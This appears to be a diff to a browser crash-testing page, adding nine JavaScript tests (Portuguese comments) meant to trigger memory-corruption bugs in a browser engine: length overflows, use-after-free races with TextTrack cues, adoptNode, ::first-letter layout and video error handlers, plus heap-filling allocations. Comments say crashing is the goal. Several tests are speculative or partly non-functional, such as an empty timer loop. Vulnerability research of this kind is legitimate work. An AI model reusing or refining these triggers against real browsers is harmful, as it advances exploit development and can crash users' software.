@@ -55,6 +55,15 @@
     <button onclick="runGCResurrection()">TEST 1: FinalizationRegistry UAF (GC Panic)</button>
     <button onclick="runCanvasStack()">TEST 2: Canvas Save() Stack Exhaustion</button>
     <button onclick="runReplaceReentrancy()">TEST 3: Node.replaceChild Reentrancy</button>
+    <button onclick="runUnshiftOverflow()">TEST 1: Array.unshift Length Overflow</button>
+    <button onclick="runCollatorRecursion()">TEST 2: Intl.Collator Infinite Recursion</button>
+    <button onclick="runPortConfusion()">TEST 3: MessagePort Self-Transfer Loop</button>
+    <button onclick="runXHRTypeConfusion()">TEST 1: XHR ResponseType Confusion (Heap Corruption)</button>
+    <button onclick="runTrackRace()">TEST 2: TextTrack Cue Iterator UAF</button>
+    <button onclick="runAdoptCrash()">TEST 3: AdoptNode Owner Mismatch</button>
+    <button onclick="runCanvasOverflow()">TEST 1: Canvas getImageData Integer Overflow</button>
+    <button onclick="runFirstLetterUAF()">TEST 2: CSS ::first-letter Layout UAF</button>
+    <button onclick="runVideoErrorUAF()">TEST 3: Video Error Event UAF</button>
 
 
 	
@@ -1586,7 +1595,344 @@ function runGCResurrection() {
                 log("Erro DOM: " + e.message);
             }
         }
+function runUnshiftOverflow() {
+            log("Iniciando Unshift Overflow...");
+            
+            try {
+                // Cria um array esparso gigante (length = 2^32 - 5)
+                const arr = [];
+                arr.length = 0xFFFFFFFF - 5; 
+                
+                log(`Array base criado. Length: ${arr.length}`);
+                log("Executando unshift(10 itens)...");
+                
+                // Se o motor somar o tamanho atual com os novos itens sem checar overflow de 32-bit:
+                // (2^32 - 5) + 10 = 5 (Overflow)
+                // Ele pode alocar um buffer para 5 itens e tentar mover os 4GB de dados virtuais.
+                arr.unshift(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
+                
+                log("Unshift terminou. Length final: " + arr.length);
+                
+            } catch(e) {
+                // RangeError é a proteção correta.
+                // Crash ou OOM é o objetivo.
+                log("Erro (Browser Protegeu): " + e.message);
+            }
+        }
 
+        // --- TESTE 2: Intl.Collator Infinite Recursion ---
+        // Tenta estourar a stack nativa da libc via comparação recursiva.
+        function runCollatorRecursion() {
+            log("Iniciando Collator Recursion...");
+            
+            const collator = new Intl.Collator();
+            
+            const evil = {
+                toString: function() {
+                    // Recursão infinita dentro da chamada nativa
+                    return this.toString(); 
+                }
+            };
+
+            try {
+                log("Comparando objeto recursivo...");
+                // O C++ chama toString -> JS chama toString -> ...
+                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
+                collator.compare(evil, "a");
+                
+            } catch(e) {
+                log("Erro (Stack Overflow capturado): " + e.message);
+            }
+        }
+
+        // --- TESTE 3: MessagePort Self-Transfer Loop ---
+        // Envia uma porta para si mesma repetidamente para estressar o kernel IPC.
+        function runPortConfusion() {
+            log("Iniciando Port Confusion...");
+            
+            try {
+                const channel = new MessageChannel();
+                let port = channel.port1;
+                const port2 = channel.port2;
+                
+                port2.onmessage = (e) => {
+                    // Recebe a porta e envia de volta imediatamente
+                    const p = e.data;
+                    // Tenta criar um loop fechado de transferência
+                    p.postMessage(p, [p]);
+                };
+
+                log("Iniciando loop de transferência...");
+                // Envia a porta para o outro lado
+                port.postMessage(port, [port]);
+                
+                // Tenta interagir com a porta "neutered"
+                setTimeout(() => {
+                    try {
+                        port.close();
+                        log("Porta fechada (se não crashou).");
+                    } catch(e) { log("Porta inacessível: " + e.message); }
+                }, 1000);
+
+            } catch(e) {
+                log("Erro Port: " + e.message);
+            }
+        }
+
+function runXHRTypeConfusion() {
+            log("Iniciando XHR Type Confusion...");
+            
+            try {
+                const xhr = new XMLHttpRequest();
+                // Usa a própria página como fonte de dados (garante que existe e carrega rápido)
+                xhr.open("GET", window.location.href + "?" + Math.random());
+                
+                let toggles = 0;
+                
+                xhr.onprogress = function() {
+                    // O GOLPE: Muda o tipo de resposta violentamente durante o download.
+                    // O C++ pode ter alocado um buffer de String e agora tem de lidar com ArrayBuffer.
+                    try {
+                        toggles++;
+                        if (toggles % 2 === 0) {
+                            xhr.responseType = "text";
+                        } else {
+                            xhr.responseType = "arraybuffer";
+                        }
+                        
+                        // Tenta acessar a resposta parcial para forçar processamento
+                        const junk = xhr.response;
+                    } catch(e) {}
+                };
+
+                xhr.onload = function() {
+                    log("Download concluído. Verificando integridade...");
+                    try {
+                        // Se a memória estiver corrompida, o acesso final pode crashar
+                        const res = xhr.response;
+                        log("Tipo final: " + typeof res);
+                    } catch(e) { log("Erro de acesso: " + e.message); }
+                };
+
+                xhr.send();
+                log("Requisição enviada. Mudando tipos...");
+
+            } catch(e) {
+                log("Erro XHR: " + e.message);
+            }
+        }
+
+        // --- TESTE 2: TextTrack Cue Iterator UAF ---
+        // Cria legendas e remove a faixa inteira quando a primeira legenda é ativada.
+        function runTrackRace() {
+            log("Iniciando TextTrack Iterator UAF...");
+            
+            const video = document.createElement('video');
+            // Adiciona uma faixa de legendas
+            const track = video.addTextTrack("subtitles", "Crash", "en");
+            track.mode = "showing";
+            
+            // Adiciona muitas cues para encher a lista
+            for(let i=0; i<100; i++) {
+                // Cues de 0.1 segundos
+                const cue = new VTTCue(i*0.1, (i+1)*0.1, "Text " + i);
+                
+                cue.onenter = function() {
+                    log("Cue " + i + " ativa. Destruindo Track...");
+                    
+                    // O GOLPE: Removemos a referência à track ou limpamos as cues.
+                    // O iterador C++ ainda está a percorrer a lista de cues para ver quem mais deve ativar.
+                    try {
+                        // Opção 1: Tenta limpar a lista de cues
+                        while(track.cues.length > 0) track.removeCue(track.cues[0]);
+                        
+                        // Opção 2: Tenta mudar o modo para desativar o processamento
+                        track.mode = "disabled";
+                        
+                        // Opção 3: Destrói o vídeo
+                        video.src = "";
+                        
+                        // Aloca lixo para ocupar a memória libertada
+                        const junk = new Array(1000).fill(1.1);
+                    } catch(e) {}
+                };
+                
+                track.addCue(cue);
+            }
+            
+            // Inicia um "playback" falso acelerando o tempo
+            // Não precisa de vídeo real, basta avançar o relógio das legendas
+            log("Avançando tempo...");
+            let time = 0;
+            const interval = setInterval(() => {
+                time += 0.05;
+                // Simula avanço de tempo que dispara os eventos 'onenter'
+                // Nota: Em um ambiente real, o video.currentTime faria isso,
+                // mas sem source válida, tentamos forçar eventos manualmente se possível
+                // ou confiar que o 'addCue' inicialize estados.
+                // Para garantir, tentamos um blob vazio como vídeo.
+            }, 10);
+            
+            // Setup de vídeo real mínimo
+            video.src = URL.createObjectURL(new Blob([""], {type:"video/mp4"}));
+            video.play().catch(e => log("Playback iniciado (pode falhar sem codec, mas ativa a track)."));
+            
+            setTimeout(() => clearInterval(interval), 2000);
+        }
+
+        // --- TESTE 3: AdoptNode Owner Mismatch ---
+        // Move nós entre documentos enquanto os modifica.
+        function runAdoptCrash() {
+            log("Iniciando AdoptNode Crash...");
+            
+            const ifr = document.getElementById('ifr');
+            const otherDoc = ifr.contentDocument;
+            
+            // Cria um nó complexo no outro documento
+            const target = otherDoc.createElement('div');
+            target.innerHTML = "<b>Move me</b>";
+            otherDoc.body.appendChild(target);
+            
+            try {
+                // Prepara um observador ou getter que roda durante a adoção?
+                // WebKit dispara eventos de mutação.
+                
+                log("Adotando nó do iframe...");
+                
+                // O GOLPE: O adoptNode muda o 'ownerDocument'.
+                // Se conseguirmos aceder ao nó no meio do processo e tentar usá-lo
+                // num contexto onde ele ainda acha que pertence ao iframe (que pode ser fechado), crash.
+                
+                const adopted = document.adoptNode(target);
+                
+                // Imediatamente remove o iframe (mata o documento original)
+                document.body.removeChild(ifr);
+                
+                // Tenta usar o nó adotado que pode ter referências internas quebradas
+                document.body.appendChild(adopted);
+                adopted.innerHTML = "Survivors";
+                
+                log("Adoção concluída (Seguro).");
+                
+                // Restaura o iframe para o próximo teste
+                const newIfr = document.createElement('iframe');
+                newIfr.id = 'ifr';
+                newIfr.style.display = 'none';
+                document.body.appendChild(newIfr);
+                
+            } catch(e) {
+                log("Erro Adopt: " + e.message);
+            }
+        }
+function runCanvasOverflow() {
+            log("Iniciando Canvas Math Attack...");
+            
+            const canvas = document.getElementById('c');
+            const ctx = canvas.getContext('2d');
+            
+            // Dimensões que, multiplicadas, podem causar overflow em 32-bit
+            // 65536 * 65536 = 4,294,967,296 (0 em 32-bit)
+            const dimensions = [
+                { w: 65536, h: 65536 }, 
+                { w: 32768, h: 32768 },
+                { w: 100000, h: 100000 }
+            ];
+
+            dimensions.forEach((dim, i) => {
+                setTimeout(() => {
+                    try {
+                        log(`Tentativa ${i}: ${dim.w}x${dim.h}...`);
+                        
+                        // O GOLPE: Pedir os dados de uma área impossível.
+                        // Se o cálculo de tamanho falhar, ele aloca pouco.
+                        // Mas a leitura tenta ler GBs de memória.
+                        const data = ctx.getImageData(0, 0, dim.w, dim.h);
+                        
+                        log("ALERTA: Buffer alocado! Tamanho reportado: " + data.data.length);
+                        
+                        // Tenta acessar o fim do buffer para forçar Page Fault se for inválido
+                        const lastByte = data.data[data.data.length - 1];
+                        
+                    } catch(e) {
+                        // Erro "IndexSizeError" ou "Out of memory" é normal.
+                        // Crash é o objetivo.
+                    }
+                }, i * 500);
+            });
+        }
+
+        // --- TESTE 2: CSS ::first-letter Layout UAF ---
+        // Manipula o DOM violentamente enquanto o motor renderiza o pseudo-elemento.
+        function runFirstLetterUAF() {
+            log("Iniciando First-Letter Renderer Stress...");
+            const target = document.getElementById('first-letter-box');
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                count++;
+                if (count > 100) {
+                    clearInterval(interval);
+                    log("Teste de Layout finalizado.");
+                    return;
+                }
+
+                try {
+                    // 1. Altera o texto (destrói o RenderObject antigo)
+                    target.innerText = "A" + Math.random();
+                    
+                    // 2. Força layout parcial
+                    const h = target.offsetHeight;
+                    
+                    // 3. Insere elemento que quebra a estrutura do ::first-letter
+                    const span = document.createElement('span');
+                    span.innerText = "B";
+                    target.insertBefore(span, target.firstChild);
+                    
+                    // 4. Remove imediatamente
+                    target.removeChild(span);
+                    
+                    // 5. Altera estilo para forçar reconstrução
+                    target.style.color = (count % 2 === 0) ? "blue" : "green";
+                    
+                } catch(e) {
+                    log("Erro DOM: " + e.message);
+                }
+            }, 10); // Loop rápido para acertar a race condition do renderizador
+        }
+
+        // --- TESTE 3: Video Error Event UAF ---
+        // Cria um vídeo inválido e destrói o elemento durante o evento de erro.
+        function runVideoErrorUAF() {
+            log("Iniciando Video Error UAF...");
+            
+            const v = document.createElement('video');
+            v.style.display = 'none';
+            document.body.appendChild(v);
+            
+            v.onerror = function() {
+                log("Evento 'error' disparado. Destruindo vídeo...");
+                
+                // O GOLPE: Remove o vídeo do DOM.
+                // O motor de mídia pode tentar acessar propriedades do vídeo
+                // para reportar detalhes do erro após este callback.
+                try {
+                    document.body.removeChild(v);
+                    
+                    // Tenta forçar GC para limpar o objeto C++
+                    const junk = [];
+                    for(let i=0; i<1000; i++) junk.push(new ArrayBuffer(10240));
+                    
+                    // Nulifica a referência JS
+                    // v = null; // (Não funciona bem dentro do handler, mas a ideia é essa)
+                    
+                } catch(e) {}
+            };
+
+            // Define uma fonte inválida para disparar o erro imediatamente
+            v.src = "http://invalid.local/" + Math.random();
+            
+            log("Fonte definida. Aguardando crash...");
+        }
    
 
     </script>
